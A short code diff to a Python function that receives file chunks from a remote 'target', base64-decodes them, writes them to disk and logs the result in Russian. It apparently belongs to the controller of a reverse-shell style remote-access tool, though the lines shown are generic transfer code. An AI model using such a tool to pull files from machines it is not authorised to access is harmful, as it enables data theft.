@@ -57,13 +57,14 @@ def download_file(command, target):
     try:
         with open(file_name, "wb") as file:
             while True:
-                chunk = reliable_recv(target, binary=True)  
-                if chunk == b"EOF":  
+                chunk = reliable_recv(target)
+                if chunk == "EOF":  
                     break
-                file.write(chunk)
-        print(f"[+] Файл {file_name} успешно загружен")
+                file.write(base64.b64decode(chunk)) 
+        logging.info(f"Файл {file_name} успешно загружен")
     except Exception as e:
-        print(f"[!!] Ошибка загрузки файла {file_name}: {e}")
+        logging.error(f"Ошибка загрузки файла {file_name}: {e}")
+
 
 
 
